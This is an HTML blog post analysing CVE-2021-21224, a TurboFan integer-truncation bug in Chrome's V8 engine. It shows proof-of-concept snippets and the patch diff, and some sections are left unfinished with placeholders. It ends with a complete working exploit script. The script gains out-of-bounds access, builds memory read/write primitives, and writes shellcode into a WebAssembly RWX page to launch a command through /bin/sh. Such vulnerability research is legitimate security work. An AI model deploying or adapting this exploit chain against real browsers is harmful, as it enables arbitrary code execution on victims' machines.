<!doctype html><html lang=en>
<head>
<title>Root Cause Analysis of CVE-2021-21224 :: Anvbis</title>
<meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=description content="An incorrect optimization in TurboFan's representation changer results in Int64 values being erroneously truncated to Int32 values.">
<meta name=keywords content>
<meta name=robots content="noodp">
<link rel=canonical href=https://anvbis.github.io/posts/root-cause-analysis-of-cve-2021-21224/>
<link rel=stylesheet href=https://anvbis.github.io/assets/style.css>
<link rel=stylesheet href=https://anvbis.github.io/assets/green.css>
<link rel=apple-touch-icon href=https://anvbis.github.io/img/apple-touch-icon-192x192.png>
<link rel="shortcut icon" href=https://anvbis.github.io/img/favicon/green.png>
<meta name=twitter:card content="summary">
<meta property="og:locale" content="en">
<meta property="og:type" content="article">
<meta property="og:title" content="Root Cause Analysis of CVE-2021-21224">
<meta property="og:description" content="An incorrect optimization in TurboFan's representation changer results in Int64 values being erroneously truncated to Int32 values.">
<meta property="og:url" content="https://anvbis.github.io/posts/root-cause-analysis-of-cve-2021-21224/">
<meta property="og:site_name" content="Anvbis">
<meta property="og:image" content="https://anvbis.github.io/img/favicon/green.png">
<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">
<meta property="article:section" content="Web Browsers">
<meta property="article:section" content="Javascript Engines">
<meta property="article:section" content="Chromium">
<meta property="article:published_time" content="2022-12-06 00:00:00 +0000 UTC">
</head>
<body class=green>
<div class="container center headings--one-size">
<header class=header>
<div class=header__inner>
<div class=header__logo>
<a href=/>
<div class=logo>
Anvbis
</div>
</a>
</div>
<div class=menu-trigger>menu</div>
</div>
<nav class=menu>
<ul class="menu__inner menu__inner--desktop">
<li><a href=/about>About</a></li>
<li><a href=/categories>Categories</a></li>
<li><a href=/posts>Posts</a></li>
</ul>
<ul class="menu__inner menu__inner--mobile">
<li><a href=/about>About</a></li>
<li><a href=/categories>Categories</a></li>
<li><a href=/posts>Posts</a></li>
</ul>
</nav>
</header>
<div class=content>
<div class=post>
<h1 class=post-title>
<a href=https://anvbis.github.io/posts/root-cause-analysis-of-cve-2021-21224/>Root Cause Analysis of CVE-2021-21224</a></h1>
<div class=post-meta>
<span class=post-date>
2022-12-06
</span>
</div>
<span class=post-tags>
#<a href=https://anvbis.github.io/tags/browser/>browser</a>&nbsp;
#<a href=https://anvbis.github.io/tags/v8/>v8</a>&nbsp;
#<a href=https://anvbis.github.io/tags/chromium/>chromium</a>&nbsp;
</span>
<div class=post-content><div>
<h2 id=1-overview>1. Overview<a href=#1-overview class=hanchor arialabel=Anchor>&#8983;</a> </h2>
<p>An incorrect optimization in TurboFan&rsquo;s representation changer results in Int64 values being erroneously truncated to Int32 values.</p>
<p>I figured this bug would be a great way to further explore TurboFan&rsquo;s simplified lowering phase, and learn more about representation change internals.</p>
<p>You can find the relevant chromium bug report <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1195777">here</a>.</p>
<h2 id=2-proof-of-concept>2. Proof of Concept<a href=#2-proof-of-concept class=hanchor arialabel=Anchor>&#8983;</a> </h2>
<p>Below is the proof-of-concept that was provided in the original issue. I&rsquo;ve reformatted it a little in order to make it a bit more readable, but the code is the same.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#75715e>/* supplied_poc.js */</span>

<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>foo</span>(<span style=color:#a6e22e>a</span>) {
  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>y</span> <span style=color:#f92672>=</span> (<span style=color:#66d9ef>new</span> Date(<span style=color:#ae81ff>42</span>)).<span style=color:#a6e22e>getMilliseconds</span>();

  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>i</span> <span style=color:#f92672>=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>a</span>) <span style=color:#a6e22e>i</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xffffffff</span>;

  <span style=color:#66d9ef>return</span> Math.<span style=color:#a6e22e>max</span>(<span style=color:#ae81ff>1</span> <span style=color:#f92672>&lt;&lt;</span> <span style=color:#a6e22e>y</span>, <span style=color:#a6e22e>i</span>, <span style=color:#ae81ff>1</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>y</span>) <span style=color:#f92672>&gt;</span> <span style=color:#a6e22e>y</span>;
}

<span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>foo</span>(<span style=color:#66d9ef>true</span>)); <span style=color:#75715e>/* true */</span>

<span style=color:#f92672>%</span><span style=color:#a6e22e>PrepareFunctionForOptimization</span>(<span style=color:#a6e22e>foo</span>);
<span style=color:#a6e22e>foo</span>(<span style=color:#66d9ef>false</span>);

<span style=color:#f92672>%</span><span style=color:#a6e22e>OptimizeFunctionOnNextCall</span>(<span style=color:#a6e22e>foo</span>);
<span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>foo</span>(<span style=color:#66d9ef>true</span>)); <span style=color:#75715e>/* false */</span>
</code></pre></div><p>In the process of investigating this bug, I also managed to produce this much simpler proof-of-concept. This is what I&rsquo;ll be using for further analysis - at the very least, a simpler PoC means a simpler Turbolizer graph.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#75715e>/* simplified_poc.js */</span>

<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>foo</span>(<span style=color:#a6e22e>a</span>) {
  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>i</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xffffffff</span>;
  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>a</span>) <span style=color:#a6e22e>i</span> <span style=color:#f92672>=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;

  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>z</span> <span style=color:#f92672>=</span> Math.<span style=color:#a6e22e>max</span>(<span style=color:#ae81ff>1337</span>, <span style=color:#a6e22e>i</span>);
  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>-</span> <span style=color:#a6e22e>z</span>;
}

<span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>foo</span>(<span style=color:#66d9ef>false</span>)); <span style=color:#75715e>/* -4294967295 */</span>

<span style=color:#f92672>%</span><span style=color:#a6e22e>PrepareFunctionForOptimization</span>(<span style=color:#a6e22e>foo</span>);
<span style=color:#a6e22e>foo</span>(<span style=color:#66d9ef>true</span>);

<span style=color:#f92672>%</span><span style=color:#a6e22e>OptimizeFunctionOnNextCall</span>(<span style=color:#a6e22e>foo</span>);
<span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>foo</span>(<span style=color:#66d9ef>false</span>)); <span style=color:#75715e>/* 1 */</span>
</code></pre></div><p>What I find particularly interesting about this simplified proof-of-concept is that it doesn&rsquo;t use the left shift operator - while the original bug report states the following:</p>
<blockquote>
<p>The following PoC generates a V8 incorrect optimization of [the] left shift operator, which leads to [the] optimized function return value to be different than [the] unoptimized function return value.</p>
</blockquote>
<p>My initial assumption is that bug is actually due to an incorrect optimization in the comparison operator (as TurboFan effectively optimizes the <code>Math.max()</code> call to an <code>Int64LessThan</code> node) rather than an incorrect optimization in the left shift operator.</p>
<p>While I might be completely wrong, it&rsquo;s definitely a topic that requires further investigation.</p>
<h2 id=3-patch-implementation-details>3. Patch Implementation Details<a href=#3-patch-implementation-details class=hanchor arialabel=Anchor>&#8983;</a> </h2>
<p>Starting by just looking at the comment provided with the patch, the vulnerability appears to be a logic bug in <code>GetWord32RepresentationFor</code>. There&rsquo;s also mention of respecting the TypeCheckKind, though I&rsquo;m not sure what this means just yet.</p>
<pre><code>[compiler] Fix bug in RepresentationChanger::GetWord32RepresentationFor
We have to respect the TypeCheckKind.
</code></pre><p>Looking at a diff of the patch itself, we can see that the bug occurs when converting a 64-bit integer to a 32-bit integer in the SimplifiedLowering phase. The author seems to have added only a single new check, ensuring that when the output type is Unsigned32, that the TypeCheckKind is kNone.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-diff data-lang=diff>diff --git a/src/compiler/representation-change.cc b/src/compiler/representation-change.cc
index 64b274c..3d937ad 100644
<span style=color:#f92672>--- a/src/compiler/representation-change.cc
</span><span style=color:#f92672></span><span style=color:#a6e22e>+++ b/src/compiler/representation-change.cc
</span><span style=color:#a6e22e></span><span style=color:#75715e>@@ -949,10 +949,10 @@
</span><span style=color:#75715e></span>     return node;
   } else if (output_rep == MachineRepresentation::kWord64) {
     if (output_type.Is(Type::Signed32()) ||
<span style=color:#f92672>-        output_type.Is(Type::Unsigned32())) {
</span><span style=color:#f92672>-      op = machine()-&gt;TruncateInt64ToInt32();
</span><span style=color:#f92672>-    } else if (output_type.Is(cache_-&gt;kSafeInteger) &amp;&amp;
</span><span style=color:#f92672>-               use_info.truncation().IsUsedAsWord32()) {
</span><span style=color:#f92672></span><span style=color:#a6e22e>+        (output_type.Is(Type::Unsigned32()) &amp;&amp;
</span><span style=color:#a6e22e>+         use_info.type_check() == TypeCheckKind::kNone) ||
</span><span style=color:#a6e22e>+        (output_type.Is(cache_-&gt;kSafeInteger) &amp;&amp;
</span><span style=color:#a6e22e>+         use_info.truncation().IsUsedAsWord32())) {
</span><span style=color:#a6e22e></span>       op = machine()-&gt;TruncateInt64ToInt32();
     } else if (use_info.type_check() == TypeCheckKind::kSignedSmall ||
                use_info.type_check() == TypeCheckKind::kSigned32 ||
</code></pre></div><p>So what happens if the TypeCheckKind is kSigned32, rather than kNone? I suspect that prior to the patch, TurboFan would erroneously truncate the Unsigned32 value to a Signed32 integer. I&rsquo;ll need to make some modifications to the patch in order to test this.</p>
<p>In the code snippet below I&rsquo;ve just edited out irrelevant code to see the control flow after the patch.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++>Node<span style=color:#f92672>*</span> RepresentationChanger<span style=color:#f92672>::</span>GetWord32RepresentationFor(
  <span style=color:#66d9ef>const</span> Operator<span style=color:#f92672>*</span> op <span style=color:#f92672>=</span> <span style=color:#66d9ef>nullptr</span>;  

  <span style=color:#75715e>/* ... */</span>

  } <span style=color:#66d9ef>else</span> <span style=color:#a6e22e>if</span> (output_rep <span style=color:#f92672>==</span> MachineRepresentation<span style=color:#f92672>::</span>kWord64) {
    <span style=color:#75715e>/* ... */</span>
    } <span style=color:#66d9ef>else</span> <span style=color:#a6e22e>if</span> (<span style=color:#75715e>/* ... */</span>
        output_type.Is(Type<span style=color:#f92672>::</span>Unsigned32()) <span style=color:#f92672>&amp;&amp;</span>
        use_info.type_check() <span style=color:#f92672>==</span> TypeCheckKind<span style=color:#f92672>::</span>kNone <span style=color:#75715e>/* ... */</span>) {
      op <span style=color:#f92672>=</span> machine()<span style=color:#f92672>-&gt;</span>TruncateInt64ToInt32();
    } 
    <span style=color:#75715e>/* ... */</span>
  }

  <span style=color:#75715e>/* ... */</span>

  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>InsertConversion</span>(node, op, use_node);
}
</code></pre></div><p>Now that I have a bit more insight into the patch itself, there are still some questions that will hopefully be answered when looking at Turbolizer graphs:</p>
<ol>
<li>Why does the value need to be converted into a Word32 representation in the first place?</li>
<li>How can we leverage this signed/unsigned integer confusion to gain code execution?</li>
</ol>
<h1 id=4-turbolizer-graph-comparison>4. Turbolizer Graph Comparison<a href=#4-turbolizer-graph-comparison class=hanchor arialabel=Anchor>&#8983;</a> </h1>
<p>&mldr;</p>
<figure class=left>
<img src=/img/20221206/turbolizer-1.png alt=turbolizer-1.png>
<figcaption class=center>Figure 1: Vulnerable turbolizer graph.</figcaption>
</figure>
<p>&mldr;</p>
<figure class=left>
<img src=/img/20221206/turbolizer-2.png alt=turbolizer-2.png>
<figcaption class=center>Figure 2: Patched turbolizer graph.</figcaption>
</figure>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++>    } <span style=color:#66d9ef>else</span> <span style=color:#a6e22e>if</span> (<span style=color:#75715e>/* ... */</span>
        output_type.Is(Type<span style=color:#f92672>::</span>Unsigned32()) <span style=color:#f92672>&amp;&amp;</span>
        use_info.type_check() <span style=color:#f92672>==</span> TypeCheckKind<span style=color:#f92672>::</span>kNone <span style=color:#75715e>/* ... */</span>) {
</code></pre></div><p>In our case, as <code>use_info.type_check()</code> is kSigned32 rather than kNone, we fail the added check.</p>
<p>So instead, our input is passed on to the following code that checks whether the output is a kPositiveSafeInteger, which it is, before being converted to a <code>CheckedUint64ToInt32</code> node, rather than a <code>TruncateInt64ToInt32</code> node.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++>      <span style=color:#66d9ef>if</span> (output_type.Is(cache_<span style=color:#f92672>-&gt;</span>kPositiveSafeInteger)) {
        op <span style=color:#f92672>=</span> simplified()<span style=color:#f92672>-&gt;</span>CheckedUint64ToInt32(use_info.feedback());
</code></pre></div><h1 id=5-summary>5. Summary<a href=#5-summary class=hanchor arialabel=Anchor>&#8983;</a> </h1>
<p>&mldr;</p>
<div class=collapsable-code>
<input id=1 type=checkbox checked>
<label for=1>
<span class=collapsable-code__language>js</span>
<span class=collapsable-code__title>exploit.js</span>
<span class=collapsable-code__toggle data-label-expand=Show data-label-collapse=Hide></span>
</label>
<pre class=language-js><code>
let bs = new ArrayBuffer(8);
let fs = new Float64Array(bs);
let is = new BigUint64Array(bs);

const ftoi = x =&gt; {
  fs[0] = x;
  return is[0];
}

const itof = x =&gt; {
  is[0] = x;
  return fs[0];
}

function foo(a) {
  let x = 0xffffffff;
  if (a) x = -1;

  let z = Math.max(0, x);
  z = 0 - z; 
  z = Math.sign(z);

  let cor = new Array(z);
  cor.shift();

  let oob = [1.1, 2.2, 3.3];
  return { cor, oob };
}

for (let i = 0; i &lt; 100000; i&#43;&#43;)
  foo(true);

let { cor, oob } = foo(false);
cor[16] = 1337;

/* flt.elements @ oob[10] (upper) */
/* obj.elements @ oob[22] (upper) */
let flt = [1.1];
let tmp = {a: 1};
let obj = [tmp];

function addrof(o) {
  let a = ftoi(oob[22]) &gt;&gt; 32n;
  let b = ftoi(oob[10]) &amp; 0xffffffffn;
  oob[10] = itof((a &lt;&lt; 32n) &#43; b);
  obj[0] = o;
  return (ftoi(flt[0]) &amp; 0xffffffffn) - 1n;
}

function read(p) {
  let a = ftoi(oob[10]) &amp; 0xffffffffn;
  oob[10] = itof(((p - 8n &#43; 1n) &lt;&lt; 32n) &#43; a);
  return ftoi(flt[0]);
}

function write(p, x) {
  let a = ftoi(oob[10]) &amp; 0xffffffffn;
  oob[10] = itof(((p - 8n &#43; 1n) &lt;&lt; 32n) &#43; a);
  flt[0] = itof(x);
}

let wasm = new Uint8Array([
  0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x85, 0x80, 0x80, 0x80,
  0x00, 0x01, 0x60, 0x00, 0x01, 0x7f, 0x03, 0x82, 0x80, 0x80, 0x80, 0x00, 0x01,
  0x00, 0x04, 0x84, 0x80, 0x80, 0x80, 0x00, 0x01, 0x70, 0x00, 0x00, 0x05, 0x83,
  0x80, 0x80, 0x80, 0x00, 0x01, 0x00, 0x01, 0x06, 0x81, 0x80, 0x80, 0x80, 0x00,
  0x00, 0x07, 0x91, 0x80, 0x80, 0x80, 0x00, 0x02, 0x06, 0x6d, 0x65, 0x6d, 0x6f,
  0x72, 0x79, 0x02, 0x00, 0x04, 0x6d, 0x61, 0x69, 0x6e, 0x00, 0x00, 0x0a, 0x8a,
  0x80, 0x80, 0x80, 0x00, 0x01, 0x84, 0x80, 0x80, 0x80, 0x00, 0x00, 0x41, 0x2a,
  0x0b
]);

let module = new WebAssembly.Module(wasm);
let instance = new WebAssembly.Instance(module);

let rwx = read(addrof(instance) &#43; 0x68n);

/* DISPLAY=&#39;:0.0&#39; xcalc */ 
let shellcode = new Uint8Array([
  0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x99, 0x50, 0x54,
  0x5f, 0x52, 0x66, 0x68, 0x2d, 0x63, 0x54, 0x5e, 0x52, 0xe8, 0x15, 0x00, 0x00,
  0x00, 0x44, 0x49, 0x53, 0x50, 0x4c, 0x41, 0x59, 0x3d, 0x27, 0x3a, 0x30, 0x2e,
  0x30, 0x27, 0x20, 0x78, 0x63, 0x61, 0x6c, 0x63, 0x00, 0x56, 0x57, 0x54, 0x5e,
  0x6a, 0x3b, 0x58, 0x0f, 0x05
]);

let buf = new ArrayBuffer(shellcode.length);
let view = new DataView(buf);

write(addrof(buf) &#43; 0x14n, rwx);

for (let i = 0; i &lt; shellcode.length; i&#43;&#43;)
  view.setUint8(i, shellcode[i]);

instance.exports.main();
</code></pre>
</div>
<h2 id=references>References<a href=#references class=hanchor arialabel=Anchor>&#8983;</a> </h2>
<ul>
<li><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1195777">Issue 1195777: Incorrect representation change from Word64 to Word32</a></li>
</ul>
</div></div>
</div>
</div>
<footer class=footer>
<div class=footer__inner>
<div class="copyright copyright--user">
<span>Anvbis &copy; 2022</span>
</div>
</div>
</footer>
<script src=https://anvbis.github.io/assets/main.js></script>
<script src=https://anvbis.github.io/assets/prism.js></script>
</div>
</body>
</html>